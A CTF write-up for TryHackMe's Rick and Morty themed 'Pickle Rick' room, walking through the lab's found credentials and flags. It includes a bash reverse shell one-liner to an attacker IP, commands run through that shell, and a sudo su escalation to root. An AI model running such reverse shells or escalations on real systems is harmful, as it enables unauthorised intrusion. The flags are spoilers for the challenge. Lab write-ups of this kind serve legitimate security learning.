---
title: "Pickle Rick CTF - TryHackMe"
category: "THM"
pubDate: 2020-05-19
description: "Writeup for the Pickle Rick CTF on TryHackMe"
---
[TryHackMe | Pickle Rick CTF](https://tryhackme.com/room/picklerick)

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

### Setup

![](https://imgur.com/rM9j9mn.png)

```
Note to self, remember username!

Username: R1ckRul3s
```

![](https://imgur.com/lUU7tXN.png)

```
Maybe a password ?
Wubbalubbadubdub
```

![](https://imgur.com/xtHHGaE.png)

```
Account:
R1ckRul3s:Wubbalubbadubdub
```

### #1 Deploy the virtual machine on this task and explore the web application. What is the first ingredient Rick needs?

![](https://imgur.com/1vWZUA9.png)

```
cat Sup3rS3cretPickl3Ingred.txt
```

![](https://imgur.com/J5cZERN.png)

Let's try something else then ...

[bash | GTFOBins](https://gtfobins.github.io/gtfobins/bash/)

```
bash -c 'exec bash -i &>/dev/tcp/10.9.2.228/4444 <&1'
```

```
www-data@ip-10-10-91-207:/var/www/html$ ls
ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
www-data@ip-10-10-91-207:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt
cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```

### #2 Whats the second ingredient Rick needs?

When you are in root you can't cd in the directory so I used the less command like so.

```
less /home/rick/"second ingredients"
1 jerry tear
```

### #3 Whats the final ingredient Rick needs?

```
www-data@ip-10-10-91-207:/var/www/html$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-91-207.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-91-207.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
www-data@ip-10-10-91-207:/var/www/html$ sudo su
cd /root/
ls
3rd.txt
snap
cat 3rd.txt
3rd ingredients: fleeb juice
```


